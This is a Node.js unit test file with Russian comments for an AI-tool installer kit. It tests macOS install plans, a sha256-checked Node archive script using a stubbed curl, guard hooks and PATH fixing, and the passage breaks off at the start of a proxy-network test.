#!/usr/bin/env node
'use strict';
// Правки по повторной проверке этапа Ж (build/reports/F-rereview.md): у каждой находки свой тест, который краснеет, если правку вернуть
//   N1  Mac: Homebrew поддерживается только на Apple Silicon с macOS 15 и новее; иначе Node это архив nodejs.org в ~/.local/node (скрипт, sha256, без пароля)
//   N3  Mac без Homebrew: Python и git через Command Line Tools; план для сочетаний «Node есть/нет × Homebrew есть/нет × macOS 12 Intel / macOS 15 Apple Silicon»
//   N5  проверяющий Claude за прокси не получает ложного «нет сети»
//   N6  update без записи хешей считает отличие «ОТЛИЧАЕТСЯ», устаревшие файлы называет и не удаляет
//   N7  config.toml Codex: неизвестный ключ внутри доверия это тревога A, а не вопрос C
//   path-fix дописывает и папку Node из ~/.local/node, с предупреждением
// Ложные отказы сторожей (R1, R2, R3, N2, N4) проверяются в tests/unit/hooks (danger-guard, cross-check-guard).
// Всё на заглушках, в фейковом HOME во временных папках; настоящие ~/.claude и ~/.codex не трогаются. Сеть не используется.
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const H = require('../../lib/harness');
const stubsLib = require('../../lib/stubs');

const S = new H.Suite('unit/fixes-g');
const ok = (n, c, d) => S.ok(n, c, d);
const TMP = H.mkTmp('wp-fixes-g-');
const HOME = path.join(TMP, 'home');
fs.mkdirSync(HOME, { recursive: true });
const BIN = stubsLib.prepare(path.join(TMP, 'bin'), ['codex', 'claude', 'python', 'python3']);
const ENV = H.sandboxEnv(HOME, { path: H.minPath([BIN]), extra: { STUB_LOG: path.join(TMP, 'stub.log') } });
process.env.WP_HOME = HOME;
const core = (m) => require(path.join(H.KIT, 'core', 'lib', m));
const text = (p) => fs.readFileSync(p, 'utf8');
const SCRIPT = path.join(H.KIT, 'core', 'scripts', 'install-node-user.sh').replace(/\\/g, '/');
const KIT_SCRIPT_EXISTS = fs.existsSync(SCRIPT);

// bash для проверки скрипта: на Windows это Git Bash (а не заглушка WSL из System32)
function findBash() {
  const cands = [];
  if (process.env.WP_TEST_BASH) cands.push(process.env.WP_TEST_BASH);
  const IS_WIN = process.platform === 'win32';
  const w = require('child_process').spawnSync(IS_WIN ? 'where' : 'which', ['bash'], { encoding: 'utf8' });
  for (const l of String(w.stdout || '').split(/\r?\n/).map((x) => x.trim()).filter(Boolean)) cands.push(l);
  const gitExe = IS_WIN ? (require('child_process').spawnSync('where', ['git'], { encoding: 'utf8' }).stdout || '').split(/\r?\n/)[0].trim() : '';
  if (gitExe) { cands.push(path.join(path.dirname(path.dirname(gitExe)), 'bin', 'bash.exe')); cands.push(path.join(path.dirname(path.dirname(path.dirname(gitExe))), 'bin', 'bash.exe')); }
  // Git\bin\bash.exe (оболочка-обёртка) ставит впереди PATH свой /mingw64/bin, и настоящий curl перекрывает заглушку теста; Git\usr\bin\bash.exe PATH не трогает.
  if (IS_WIN) for (const c of cands.slice()) { const m = c.match(/^(.*[\\/]Git)[\\/](?:bin|usr[\\/]bin|cmd)[\\/]/i); if (m) cands.unshift(path.join(m[1], 'usr', 'bin', 'bash.exe')); }
  for (const c of [...new Set(cands)]) {
    if (!fs.existsSync(c) || /System32/i.test(c)) continue;
    const r = H.run(c, ['-c', 'echo ok']);
    if (r.code === 0 && /^ok/.test(r.out)) return c;
  }
  return null;
}

(async () => {
  try {
    // ====================================================================== N1, N3: план по версии macOS и процессору
    S.section('N1, N3) план для Mac: Homebrew только если поддерживается и уже стоит; иначе архив Node и Command Line Tools');
    {
      const plan = core('plan.js');
      const ms = core('macsupport.js');
      const INTEL12 = { platform: 'darwin', version: '12.7.6', arch: 'x64', apple_silicon: false };
      const ARM15 = { platform: 'darwin', version: '15.1', arch: 'arm64', apple_silicon: true };
      const mk = (osInfo, o) => ({ os: osInfo, tools: { managers: o.brew ? [{ name: 'brew', path: '/opt/homebrew/bin/brew' }] : [],
        node: o.node ? { copies: [{ path: '/x/node', version: 'v22.0.0' }], ok: true, running: { version: 'v22.0.0' } } : { copies: [], ok: false, running: { version: 'v18.0.0' } },
        python: { version: o.python || null, stubs: [] }, git: o.git ? { version: '2.39.0', note: '' } : null }, case: { id: 'empty' } });
      const nodeOf = (steps) => steps.find((s) => s.stage === 'P1.node'), pyOf = (steps) => steps.find((s) => s.stage === 'P1.python'), gitOf = (steps) => steps.find((s) => s.stage === 'P1.git');
      const allCmds = (steps) => steps.flatMap((s) => s.commands || []).map((c) => c.display);

      for (const [label, osInfo, intel] of [['macOS 12 Intel', INTEL12, true], ['macOS 15 Apple Silicon', ARM15, false]]) {
        for (const nodeHas of [false, true]) for (const brewHas of [false, true]) {
          const name = label + ', Node ' + (nodeHas ? 'есть' : 'нет') + ', Homebrew ' + (brewHas ? 'есть' : 'нет');
          const steps = plan.systemSteps(mk(osInfo, { node: nodeHas, brew: brewHas }), {});
          const node = nodeOf(steps), py = pyOf(steps), cmds = allCmds(steps);
          const brewAllowed = !intel && brewHas;                       // единственный случай, где ИИ вправе выполнять brew
          ok(name + ': команды brew есть только там, где Homebrew поддерживается и уже стоит', brewAllowed ? cmds.some((c) => /^brew install node$/.test(c) || /^brew install python$/.test(c)) || nodeHas : !cmds.some((c) => /\bbrew\b/.test(c)) , JSON.stringify(cmds));
          ok(name + ': команды установки Homebrew (brew.sh) в плане нет, брать его человеку не предлагается как шаг', !cmds.some((c) => /brew\.sh/.test(c)) && !steps.some((s) => (s.commands || []).some((c) => /brew\.sh/.test(c.display + c.source))), JSON.stringify(cmds));
          if (nodeHas) ok(name + ': Node есть, шаг «уже есть»', node.status === 'done');
          else if (brewAllowed) ok(name + ': Node через `brew install node`', node.commands.length === 1 && node.commands[0].display === 'brew install node' && node.commands[0].run.cmd === 'brew', JSON.stringify(node.commands));
          else {
            const want = intel ? '--major 22' : '--major 24';
            ok(name + ': Node архивом (' + want + '), без пароля, без brew', node.commands.length === 1 && node.commands[0].script === true && node.commands[0].display.includes('install-node-user.sh') && node.commands[0].display.includes(want) && node.needsPassword === false && !node.commands[0].run, JSON.stringify(node.commands));
            ok(name + ': запасной путь .pkg назван запасным, с объяснением про пароль', /Запасной путь/.test(node.fallback) && /\.pkg/.test(node.fallback) && /парол/.test(node.fallback));
            ok(name + ': сказано, как вызывать Node до PATH (полный путь) и про перезапуск программы ИИ', /~\/\.local\/node\/bin\/node/.test(node.after) && /path-fix/.test(node.after) && /заново/.test(node.after), node.after);
            if (intel) ok(name + ': замечание «Homebrew для вашего Mac не поддерживается»/«стоит, но не поддерживается»', /не поддерживается/.test(node.warn || ''), node.warn);
            if (!intel && !brewHas) ok(name + ': Homebrew поддерживается, но не нужен: сказано, что ИИ его не ставит', !node.warn && /Homebrew для этой установки не нужен/.test(node.homebrewNote) && /я его не ставлю/.test(node.homebrewNote), JSON.stringify([node.warn, node.homebrewNote]));
          }
          // Python (N3)
          if (brewAllowed) ok(name + ': Python через `brew install python`', py.commands[0].display === 'brew install python' && py.commands[0].run.cmd === 'brew', JSON.stringify(py.commands));
          else {
            ok(name + ': Python через Command Line Tools (xcode-select --install, окно системы, человек)', py.commands.length === 1 && py.commands[0].display === 'xcode-select --install' && py.commands[0].human === true && !py.commands[0].run, JSON.stringify(py.commands));
            ok(name + ': запасной путь Python это python.org, а не заглушка; проверка python3 только после xcode-select -p', /python\.org\/downloads\/macos/.test(py.fallback) && /xcode-select -p/.test(py.hint) && /заглушк/.test(py.hint), JSON.stringify([py.fallback, py.hint]));
            ok(name + ': git это то же окно Command Line Tools, и шаг говорит об этом', gitOf(steps).commands[0].display === 'xcode-select --install' && /то же окно/.test(gitOf(steps).note || ''), JSON.stringify(gitOf(steps)));
          }
        }
      }
      ok('скрипт Node из плана существует в пакете', KIT_SCRIPT_EXISTS && /install-node-user\.sh/.test(nodeOf(plan.systemSteps(mk(INTEL12, {}), {})).commands[0].display));

      // границы версий
      const probe = (v, arch, as) => ms.nodeArchive({ platform: 'darwin', version: v, arch, apple_silicon: as });
      ok('macOS 13.4 -> Node 22, 13.5 -> Node 24, 11.0 -> Node 22, 26.0 -> Node 24, 10.15 -> отказ', probe('13.4', 'x64', false).major === 22 && probe('13.5', 'x64', false).major === 24 && probe('11.0', 'x64', false).major === 22 && probe('26.0', 'arm64', true).major === 24 && probe('10.15.7', 'x64', false).ok === false);
      ok('версия macOS неизвестна: major не выдумывается (null), скрипт определит сам', probe('', 'x64', false).major === null && probe('', 'x64', false).ok === true);
      const blocked = nodeOf(plan.systemSteps(mk({ platform: 'darwin', version: '10.15.7', arch: 'x64', apple_silicon: false }, {}), {}));
      ok('macOS ниже 11: шаг Node «не поставить», сказано человеку, команд нет', blocked.commands.length === 0 && /ниже 11/.test(blocked.blocked) && /остановись/.test(blocked.blocked), JSON.stringify(blocked));
      const bs = (v, arch, as) => ms.brewSupport({ platform: 'darwin', version: v, arch, apple_silicon: as });
      ok('Homebrew: Apple Silicon macOS 15 и 26 поддерживается; macOS 14 и 12 на Apple Silicon нет; Intel любой версии нет', bs('15.0', 'arm64', true).supported && bs('26.0', 'arm64', true).supported && !bs('14.6', 'arm64', true).supported && !bs('12.7', 'arm64', true).supported && !bs('15.2', 'x64', false).supported && !bs('12.7.6', 'x64', false).supported);
      ok('Homebrew: Rosetta (Node x64 на Apple Silicon, apple_silicon = true) считается Apple Silicon; без apple_silicon решает arch', bs('15.1', 'x64', true).supported && bs('15.1', 'arm64', undefined).supported && !bs('15.1', 'x64', undefined).supported);
      ok('Homebrew: не Mac -> не поддерживается; версия не определена на Apple Silicon -> не поддерживается (нет подтверждения)', !ms.brewSupport({ platform: 'win32' }).supported && !bs('', 'arm64', true).supported);
      ok('причина для Intel называет Tier 3 и источник с датой', /Tier 3/.test(bs('15.2', 'x64', false).why) && /docs\.brew\.sh/.test(bs('15.2', 'x64', false).why) && /21\.10\.2026/.test(bs('15.2', 'x64', false).why));
      // Homebrew стоит, но Mac Intel: brew не используется и не трогается
      const intelWithBrew = plan.systemSteps(mk(INTEL12, { brew: true }), {});
      ok('Intel с уже стоящим Homebrew: Node всё равно архивом, сказано «Homebrew не трогаю»', /не трогаю/.test(nodeOf(intelWithBrew).warn) && nodeOf(intelWithBrew).commands[0].script === true);
      // Windows без изменений
      const win = plan.systemSteps(mk({ platform: 'win32', version: '10.0.26100', arch: 'x64' }, {}), {});
      ok('Windows без изменений: winget для Node, Python и git', /winget install -e --id OpenJS\.NodeJS\.LTS/.test(nodeOf(win).commands[0].display) && /Python\.Python\.3\.13/.test(pyOf(win).commands[0].display) && /Git\.Git/.test(gitOf(win).commands[0].display));
      // текст для человека
      const render = (steps) => plan.render({ case: { id: 'empty' }, direction: { main: 'claude', reviewer: 'codex' }, steps, questions: [], profile_notice: null, npm_note: '' });
      const rI = render(plan.systemSteps(mk(INTEL12, {}), {}));
      ok('текст плана для Intel macOS 12: архив Node 22, Command Line Tools, «не поддерживается», без brew.sh и без `brew install`', /install-node-user\.sh --major 22/.test(rI) && /xcode-select --install/.test(rI) && /Homebrew для вашего Mac не поддерживается/.test(rI) && !/(^|[^.\w])brew\.sh/.test(rI) && !/`brew install/.test(rI), rI);
      const rB = render(plan.systemSteps(mk(ARM15, { brew: true }), {}));
      ok('текст плана для macOS 15 Apple Silicon с Homebrew: brew install node и brew install python', /`brew install node`/.test(rB) && /`brew install python`/.test(rB), rB);
      // разведка: замечание про Homebrew
      const recon = core('recon.js');
      const savePath = process.env.PATH;
      process.env.PATH = H.minPath([BIN]);
      let wI, wA;
      try {
        const base = recon.collect({ scan: false });
        base.os = Object.assign({}, base.os, INTEL12); wI = recon.warnings(base).filter((w) => /Homebrew/.test(w));
        base.os = Object.assign({}, base.os, ARM15); wA = recon.warnings(base).filter((w) => /Homebrew/.test(w));
      } finally { process.env.PATH = savePath; }
      ok('recon: на Intel macOS 12 есть замечание «Homebrew для вашего Mac не поддерживается»; на macOS 15 Apple Silicon нет', wI.length === 1 && /не поддерживается/.test(wI[0]) && /Tier 3/.test(wI[0]) && wA.length === 0, JSON.stringify([wI, wA]));
      ok('recon: поле os.apple_silicon есть (только чтение: sysctl)', typeof recon.collect({ scan: false, }).os.apple_silicon === 'boolean');
      // документы
      const inst = text(path.join(H.KIT, 'INSTALL.md')), macmd = text(path.join(H.KIT, 'docs', 'install-steps', 'mac.md')), rw = text(path.join(H.KIT, 'docs', 'recon-without-node.md')), tr = text(path.join(H.KIT, 'docs', 'troubleshooting.md'));
      ok('INSTALL.md: ветка по поддержке Homebrew, архив, скрипт, sha256, Tier 3 с источником и датой', /install-node-user\.sh/.test(inst) && /Tier 3/.test(inst) && /docs\.brew\.sh\/Support-Tiers/.test(inst) && /21\.10\.2026/.test(inst) && /SHASUMS256\.txt/.test(inst) && /~\/\.local\/node/.test(inst));
      ok('INSTALL.md и docs: нет прежнего «основной путь это Homebrew» и `brew install node python git`', ![inst, macmd, rw, tr].some((t) => /основной путь это Homebrew|brew install node python git|основной путь: человек запускает/.test(t)));
      ok('INSTALL.md, шаг 6: Python на Mac через Command Line Tools, до пути xcode-select -p python3 не запускать, запасной путь python.org, path-fix с Node', /xcode-select -p/.test(inst) && /python\.org\/downloads\/macos/.test(inst) && /path-fix --dry-run/.test(inst) && /~\/\.local\/node\/bin\/node/.test(inst));
      ok('docs/install-steps/mac.md: таблица «Какой путь у вашего Mac», Intel и macOS ниже 15 без Homebrew, python.org запасной', /Какой путь у вашего Mac/.test(macmd) && /Intel \(любая macOS\)/.test(macmd) && /python\.org\/downloads\/macos/.test(macmd) && /Tier 3/.test(macmd));
      ok('docs/recon-without-node.md: sysctl hw.optional.arm64 для процессора и архив Node для Mac без Homebrew', /sysctl -n hw\.optional\.arm64/.test(rw) && /install-node-user\.sh/.test(rw));
      ok('сценарии без Node в INSTALL.md и мак-документах не просят оболочку с профилями (zsh -ilc) и не ставят Homebrew сами', !/(предлагается|проверяется|или) `?zsh -ilc 'command -v/.test(inst + macmd + rw + tr));
    }

    // ====================================================================== скрипт Node: архив, sha256, без пароля
    S.section('N1) install-node-user.sh: архив nodejs.org, sha256 по SHASUMS256.txt, папка пользователя (заглушки curl, без сети)');
    {
      const bash = findBash();
      const src = text(SCRIPT);
      ok('скрипт: только LF, начинается с #!/bin/sh, bash -n без ошибок', !/\r/.test(src) && src.startsWith('#!/bin/sh\n'));
      ok('скрипт не просит пароль и не трогает профили: нет sudo, osascript, .zshrc, installer, brew; rm -rf только временной папки', !/\bsudo\b|osascript|\.zshrc|\.zprofile|\bbrew\b|\binstaller\b/.test(src.replace(/#.*$/gm, '')) && (src.match(/rm -rf/g) || []).length === 1 && /rm -rf "\$WORK"/.test(src));
      ok('скрипт ходит только на https://nodejs.org/dist/', (src.match(/https?:\/\/[^\s"')]+/g) || []).length > 0 && (src.match(/https?:\/\/[^\s"')]+/g) || []).every((x) => /^https:\/\/nodejs\.org\/dist\//.test(x)), JSON.stringify(src.match(/https?:\/\/[^\s"')]+/g)));
      if (!bash) {
        ok('bash для проверки скрипта найден (на Windows нужен Git Bash)', false, 'нет bash: набор не может проверить скрипт');
      } else {
        // Git Bash не кладёт свои /usr/bin в PATH, если его запустил не он сам: добавляем, чтобы были grep, awk, sed (на Mac они в /usr/bin)
        const unixBin = [path.dirname(bash), path.join(path.dirname(path.dirname(bash)), 'usr', 'bin'), path.join(path.dirname(bash), '..', 'usr', 'bin')].find((d) => fs.existsSync(path.join(d, process.platform === 'win32' ? 'grep.exe' : 'grep')));
        const scratch = path.join(TMP, 'scratch').replace(/\\/g, '/'); fs.mkdirSync(scratch, { recursive: true });
        const b = (args, o) => { const opts = Object.assign({ cwd: TMP }, o || {}); opts.env = Object.assign({}, ENV, unixBin ? { PATH: unixBin + path.delimiter + ENV.PATH, Path: unixBin + path.delimiter + ENV.PATH } : {}, { WP_NODE_TEST: '1', TMPDIR: scratch }, (o && o.env) || {}); const fwd = args.map((a, i) => (args[i - 1] === '--dest' ? String(a).split(path.sep).join('/') : a)); return H.run(bash, [SCRIPT, ...fwd], opts); };
        ok('bash -n: синтаксис скрипта', H.run(bash, ['-n', SCRIPT]).code === 0);
        // --dry-run: версия по macOS и процессору, ничего не пишется
        const table = [['12.7.6', 'x64', 22], ['13.4', 'x64', 22], ['13.5', 'x64', 24], ['11.0', 'arm64', 22], ['15.1', 'arm64', 24], ['26.0', 'arm64', 24]];
        const ms = core('macsupport.js');
        for (const [v, arch, major] of table) {
          const r = b(['--dry-run', '--macos-version', v, '--arch', arch, '--dest', path.join(TMP, 'dry-dest')]);
          const planMajor = ms.nodeArchive({ platform: 'darwin', version: v, arch, apple_silicon: arch === 'arm64' }).major;
          ok('--dry-run macOS ' + v + ' ' + arch + ': Node ' + major + ' (план в plan.js выбирает то же: ' + planMajor + '), печатает «ПЛАН:», ничего не создаёт', r.code === 0 && /^ПЛАН: Node (\d+)/m.exec(r.out) && Number(/^ПЛАН: Node (\d+)/m.exec(r.out)[1]) === major && planMajor === major && !fs.existsSync(path.join(TMP, 'dry-dest')) && new RegExp('latest-v' + major + '\\.x').test(r.out), r.all);
        }
        let r = b(['--dry-run', '--macos-version', '10.15.7', '--arch', 'x64']);
        ok('--dry-run macOS 10.15: отказ (код 1) с понятным текстом', r.code === 1 && /слишком старая/.test(r.all), r.all);
        r = b(['--dry-run', '--macos-version', '12.1', '--arch', 'x64', '--major', '24']);
        ok('Node 24 на macOS 12: отказ (код 1), предложена версия 22', r.code === 1 && /--major 22/.test(r.all), r.all);
        r = b(['--bogus']);
        ok('неизвестный параметр: код 2', r.code === 2, r.all);
        r = H.run(bash, [SCRIPT, '--dry-run'], { env: Object.assign({}, ENV), cwd: TMP });
        ok('без WP_NODE_TEST скрипт на не-Mac отказывает (код 1): «только для macOS»', process.platform === 'darwin' || (r.code === 1 && /только для macOS/.test(r.all)), r.all);

        // фиксации: каталоги по major, архивы с «Node», который печатает версию
        const FIX = path.join(TMP, 'fix');
        const mkArchive = (major, arch) => {
          const ver = 'v' + major + '.9.9', name = 'node-' + ver + '-darwin-' + arch;
          const stage = path.join(TMP, 'stage-' + major + arch);
          fs.mkdirSync(path.join(stage, name, 'bin'), { recursive: true });
          fs.writeFileSync(path.join(stage, name, 'bin', 'node'), '#!/bin/sh\necho ' + ver + '\n');
          fs.chmodSync(path.join(stage, name, 'bin', 'node'), 0o755);
          const dir = path.join(FIX, String(major)); fs.mkdirSync(dir, { recursive: true });
          const out = path.join(dir, name + '.tar.gz');
          const t = H.run('tar', ['-czf', path.basename(out), '-C', stage, name], { cwd: dir });
          if (t.code !== 0) throw new Error('tar: ' + t.all);
          return { name: name + '.tar.gz', sum: crypto.createHash('sha256').update(fs.readFileSync(out)).digest('hex'), dir };
        };
        const writeSums = (major, lines) => fs.writeFileSync(path.join(FIX, String(major), 'SHASUMS256.txt'), lines.join('\n') + '\n');
        const a22x = mkArchive(22, 'x64'), a22a = mkArchive(22, 'arm64'), a24a = mkArchive(24, 'arm64');
        writeSums(22, [a22a.sum + '  ' + a22a.name, a22x.sum + '  ' + a22x.name, '0'.repeat(64) + '  ' + a22x.name.replace('.tar.gz', '.tar.xz'), '1'.repeat(64) + '  node-v22.9.9-linux-x64.tar.gz']);
        writeSums(24, [a24a.sum + '  ' + a24a.name]);
        const stubDir = path.join(TMP, 'curl-stub'); fs.mkdirSync(stubDir, { recursive: true });
        const log = path.join(TMP, 'curl.log');
        fs.writeFileSync(path.join(stubDir, 'curl'), [
          '#!/bin/sh', 'out=""; url=""',
          'while [ $# -gt 0 ]; do case "$1" in -o) out=$2; shift;; --retry) shift;; -*) ;; *) url=$1;; esac; shift; done',
          'echo "$url" >> "' + log.replace(/\\/g, '/') + '"',
          'major=$(echo "$url" | sed -n \'s#.*latest-v\\([0-9]*\\)\\.x.*#\\1#p\')',
          'name=${url##*/}',
          'src="' + FIX.replace(/\\/g, '/') + '/$major/$name"',
          '[ -f "$src" ] || exit 22', 'cp "$src" "$out"', ''].join('\n'));
        fs.chmodSync(path.join(stubDir, 'curl'), 0o755);
        const bashPath = [stubDir, unixBin, ENV.PATH].filter(Boolean).join(path.delimiter);
        const withStub = { env: { PATH: bashPath, Path: bashPath } };
        const urls = () => (fs.existsSync(log) ? text(log).split(/\r?\n/).filter(Boolean) : []);

        // успех: macOS 12 Intel -> Node 22 x64
        const dest = path.join(HOME, '.local', 'node');
        const homeBefore = H.treeMap(HOME);
        r = b(['--macos-version', '12.7.6', '--arch', 'x64', '--dest', dest], withStub);
        ok('macOS 12 Intel: код 0, Node 22 распакован в папку пользователя, версия напечатана', r.code === 0 && fs.existsSync(path.join(dest, 'bin', 'node')) && /Готово: Node v22\.9\.9/.test(r.out), r.all);
        ok('скачаны ровно SHASUMS256.txt и архив darwin-x64 с nodejs.org/dist/latest-v22.x/, больше ничего', JSON.stringify(urls()) === JSON.stringify(['https://nodejs.org/dist/latest-v22.x/SHASUMS256.txt', 'https://nodejs.org/dist/latest-v22.x/' + a22x.name]), JSON.stringify(urls()));
        ok('сказано, что сумма совпала, что PATH и профили не менялись; указан путь для вызова до PATH', /Контрольная сумма совпала/.test(r.out) && /PATH и профили оболочки не менялись/.test(r.out) && /path-fix/.test(r.out), r.out);
        const md = H.mapDiff(homeBefore, H.treeMap(HOME));
        ok('в фейковом HOME изменилась только папка ~/.local/node (профилей нет, чужого нет)', md.changed.length === 0 && md.removed.length === 0 && md.added.length > 0 && md.added.every((x) => /^\.local(\/node(\/|$)|$)/.test(String(x).replace(/\\/g, '/'))), JSON.stringify(md));
        ok('временная папка скрипта убрана (в TEMP фейкового HOME нет wp-node.*)', !fs.readdirSync(os.tmpdir()).some((n) => /^wp-node\./.test(n)));
        // повтор: уже стоит, сети нет
        fs.writeFileSync(log, '');
        r = b(['--macos-version', '12.7.6', '--arch', 'x64', '--dest', dest], withStub);
        ok('повторный запуск: «уже стоит», код 0, в сеть не ходил', r.code === 0 && /уже стоит/.test(r.out) && urls().length === 0, r.all);
        // не совпала сумма
        const dest2 = path.join(HOME, 'node-bad');
        writeSums(22, ['f'.repeat(64) + '  ' + a22x.name]);
        r = b(['--macos-version', '12.7.6', '--arch', 'x64', '--dest', dest2], withStub);
        ok('сумма не совпала: код 3, текст про «ничего не распаковано», папка не создана', r.code === 3 && /контрольная сумма не совпала/.test(r.err) && /ничего не распаковано/.test(r.err) && !fs.existsSync(dest2), r.all);
        // нет нужного архива
        writeSums(22, ['1'.repeat(64) + '  node-v22.9.9-linux-x64.tar.gz']);
        r = b(['--macos-version', '12.7.6', '--arch', 'x64', '--dest', path.join(HOME, 'node-none')], withStub);
        ok('в SHASUMS256.txt нет архива под этот процессор: код 1, ничего не создано', r.code === 1 && /нет архива/.test(r.err) && !fs.existsSync(path.join(HOME, 'node-none')), r.all);
        // две подходящие строки: не гадаем
        writeSums(22, [a22x.sum + '  ' + a22x.name, a22x.sum + '  ' + a22x.name]);
        r = b(['--macos-version', '12.7.6', '--arch', 'x64', '--dest', path.join(HOME, 'node-two')], withStub);
        ok('две одинаковые строки в SHASUMS256.txt: отказ, ничего не создано', r.code === 1 && /несколько/.test(r.err) && !fs.existsSync(path.join(HOME, 'node-two')), r.all);
        writeSums(22, [a22a.sum + '  ' + a22a.name, a22x.sum + '  ' + a22x.name]);
        // занятая папка без Node
        const busy = path.join(HOME, 'busy'); fs.mkdirSync(busy, { recursive: true }); fs.writeFileSync(path.join(busy, 'mine.txt'), 'моё');
        fs.writeFileSync(log, '');
        r = b(['--macos-version', '12.7.6', '--arch', 'x64', '--dest', busy], withStub);
        ok('папка занята чужими файлами: отказ (код 1), файлы целы, в сеть не ходил', r.code === 1 && /не пуста/.test(r.err) && text(path.join(busy, 'mine.txt')) === 'моё' && urls().length === 0, r.all);
        // сайт недоступен
        r = b(['--macos-version', '15.1', '--arch', 'arm64', '--dest', path.join(HOME, 'node-net')], withStub);
        ok('Apple Silicon macOS 15: Node 24 arm64 ставится (другой каталог latest-v24.x)', r.code === 0 && /Готово: Node v24\.9\.9/.test(r.out) && urls().some((u) => /latest-v24\.x\/SHASUMS256\.txt/.test(u)), r.all);
        fs.rmSync(path.join(FIX, '22', 'SHASUMS256.txt'));
        r = b(['--macos-version', '12.7.6', '--arch', 'x64', '--dest', path.join(HOME, 'node-offline')], withStub);
        ok('SHASUMS256.txt не скачался: код 1, понятный текст, ничего не создано', r.code === 1 && /не скачался/.test(r.err) && !fs.existsSync(path.join(HOME, 'node-offline')), r.all);
      }
    }

    // ====================================================================== команды плана Mac проходят всех трёх сторожей
    S.section('N1, N3) команды плана Mac (архив Node, Command Line Tools, path-fix с полным путём Node) не останавливаются тремя сторожами');
    {
      const root = path.join(HOME, 'root-guards');
      const ini = H.node(H.WP_SRC, ['init', '--root', root, '--main', 'claude', '--no-scan'], { cwd: TMP, env: ENV });
      ok('подготовка: главная папка для сторожей', ini.code === 0, ini.all);
      const hookEnv = Object.assign({}, ENV, { CLAUDE_PROJECT_DIR: root });
      const cmds = [
        'bash ~/Downloads/workplace-installer-4.0.0-dev/core/scripts/install-node-user.sh --dry-run',
        'bash ~/Downloads/workplace-installer-4.0.0-dev/core/scripts/install-node-user.sh --major 22',
        'bash ~/Downloads/workplace-installer-4.0.0-dev/core/scripts/install-node-user.sh',
        '~/.local/node/bin/node ~/Downloads/workplace-installer-4.0.0-dev/core/cli/wp.js recon',
        '~/.local/node/bin/node ~/Downloads/workplace-installer-4.0.0-dev/core/cli/wp.js init --root ~/workplace',
        '~/.local/node/bin/node .workplace/core/cli/wp.js state log "Node поставлен до init: архив nodejs.org в ~/.local/node"',
        '~/.local/node/bin/node .workplace/core/cli/wp.js path-fix --dry-run',
        '~/.local/node/bin/node .workplace/core/cli/wp.js path-fix --yes',
        '~/.local/node/bin/node --version', 'xcode-select -p', 'xcode-select --install', '/usr/bin/python3 --version', 'sw_vers -productVersion', 'sysctl -n hw.optional.arm64', 'uname -m',
      ];
      const hooks = ['danger-guard', 'secret-guard', 'cross-check-guard'];
      const stopped = [];
      for (const c of cmds) for (const hk of hooks) {
        const r = H.run(process.execPath, [path.join(H.KIT, 'core', 'hooks', hk + '.js')], { cwd: root, env: hookEnv, input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: c }, cwd: root }) });
        if (r.code !== 0 || r.out.trim()) stopped.push(hk + ': ' + c + ' -> ' + (r.out || r.err).slice(0, 120));
      }
      ok('все ' + cmds.length + ' команд плана Mac проходят danger-guard, secret-guard и cross-check-guard молча', stopped.length === 0, stopped.join('\n'));
      const ctrl = H.run(process.execPath, [path.join(H.KIT, 'core', 'hooks', 'danger-guard.js')], { cwd: root, env: hookEnv, input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'sudo bash installer.sh' }, cwd: root }) });
      ok('контроль: сторож действительно отвечает (sudo -> deny)', /"deny"/.test(ctrl.out), ctrl.all);
    }

    // ====================================================================== path-fix с Node из ~/.local/node
    S.section('N1) path-fix: папка Node из ~/.local/node попадает в PATH, с предупреждением человеку');
    {
      const inst = core('install.js');
      const home = '/home/user';
      const p = inst.pathFixPlan({ shell: '/bin/zsh', home, platform: 'darwin', dirs: [home + '/.local/node/bin', home + '/.local/bin'] });
      ok('pathFixPlan: строки для ~/.local/node/bin и ~/.local/bin, профиль ~/.zshrc', p.profile === '.zshrc' && p.lines.join('|') === 'export PATH="$HOME/.local/node/bin:$PATH"|export PATH="$HOME/.local/bin:$PATH"', JSON.stringify(p));
      ok('папка Node для PATH: ~/.local/node/bin берётся, если её нет в PATH; системные папки Node и папка, уже лежащая в PATH, нет', inst.nodeDirForPath(home + '/.local/node/bin/node', home, ['/usr/bin']) === home + '/.local/node/bin' && inst.nodeDirForPath('/usr/local/bin/node', home, ['/usr/bin']) === null && inst.nodeDirForPath(home + '/.local/node/bin/node', home, [home + '/.local/node/bin']) === null && inst.nodeDirForPath('/opt/homebrew/bin/node', home, []) === null);
      ok('path-fix печатает предупреждение «папка Node встанет в PATH ПЕРВОЙ» и просит перезапуск программы ИИ', /встанет в PATH ПЕРВОЙ/.test(text(path.join(H.KIT, 'core', 'lib', 'install.js'))) && /закрыть и открыть заново/.test(text(path.join(H.KIT, 'core', 'lib', 'install.js'))));
      if (process.platform === 'win32') console.log('  (запись path-fix с Node из ~/.local/node проверяется на Mac и Linux в CI: на Windows профилей оболочки нет)');
      else {
        const nodeHome = path.join(HOME, 'pf'); const nodeBin = path.join(nodeHome, '.local', 'node', 'bin'); fs.mkdirSync(nodeBin, { recursive: true });
        fs.copyFileSync(process.execPath, path.join(nodeBin, 'node')); fs.chmodSync(path.join(nodeBin, 'node'), 0o755);
        const env2 = H.sandboxEnv(nodeHome, { path: H.minPath([BIN]), extra: { SHELL: '/bin/zsh' } });
        const init = H.run(path.join(nodeBin, 'node'), [H.WP_SRC, 'init', '--root', path.join(nodeHome, 'wp'), '--main', 'claude', '--no-scan'], { cwd: TMP, env: env2 });
        const r = H.run(path.join(nodeBin, 'node'), [path.join(nodeHome, 'wp', '.workplace', 'core', 'cli', 'wp.js'), 'path-fix', '--yes', '--human-said', 'да, допиши PATH'], { cwd: path.join(nodeHome, 'wp'), env: env2 });
        const rc = path.join(nodeHome, '.zshrc');
        ok('Mac и Linux: path-fix дописал строку Node в ~/.zshrc, предупредил, объявил запись', init.code === 0 && r.code === 0 && fs.existsSync(rc) && /export PATH="\$HOME\/\.local\/node\/bin:\$PATH"/.test(text(rc)) && /ПРЕДУПРЕЖДЕНИЕ человеку/.test(r.out), 'init ' + init.code + ', path-fix ' + r.code + '\n' + r.all + '\n' + init.all.slice(-200));
      }
    }

    // ====================================================================== N5: проверяющий Claude за прокси
    S.section('N5) проверяющий Claude за прокси: голое соединение с api.anthropic.com:443 не повод для «нет сети»');
    {
      const prov = require(path.join(H.KIT, 'core', 'providers', 'claude.js'));
      const net = require('net');
